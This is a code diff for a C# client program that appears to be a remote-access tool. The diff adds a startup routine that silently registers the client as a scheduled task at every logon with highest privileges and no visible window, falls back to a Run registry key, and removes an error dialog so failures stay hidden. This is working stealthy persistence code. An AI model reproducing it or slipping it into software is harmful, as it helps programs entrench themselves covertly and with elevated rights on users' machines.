@@ -1,5 +1,6 @@
 ﻿using Client.Controllers.Tools;
 using Client.Models;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -21,9 +22,8 @@ namespace Client.Controllers
                 {
                     Directory.CreateDirectory(Path.Combine(Boot.DIRECTORY, Boot.installSubDirectory));
                 }
-                catch(Exception ex)
+                catch(Exception)
                 {
-                    System.Windows.Forms.MessageBox.Show(ex.ToString());
                     return;
                 }
 
@@ -67,7 +67,7 @@ namespace Client.Controllers
 
             if (Boot.autoStartEnabled)
             {
-                if(!Boot.AddToStartup())
+                if(!AddToStartup())
                     ClientData.AddToStartupFailed = true;
             }
 
@@ -98,6 +98,39 @@ namespace Client.Controllers
             }
             catch (Exception)
             {
+            }
+        }
+
+        public static bool AddToStartup()
+        {
+            if (AuthenticationController.getAccountType() == "Admin")
+            {
+                try
+                {
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/create /tn \"" + Boot.startupName + "\" /sc ONLOGON /tr \"" + ClientData.currentPath + "\" /rl HIGHEST /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
+
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return true;
+                }
+                catch (Exception)
+                {
+                }
+
+                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Boot.startupName, ClientData.currentPath,
+                    true);
+            }
+            else
+            {
+                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Boot.startupName, ClientData.currentPath,
+                    true);
             }
         }
 
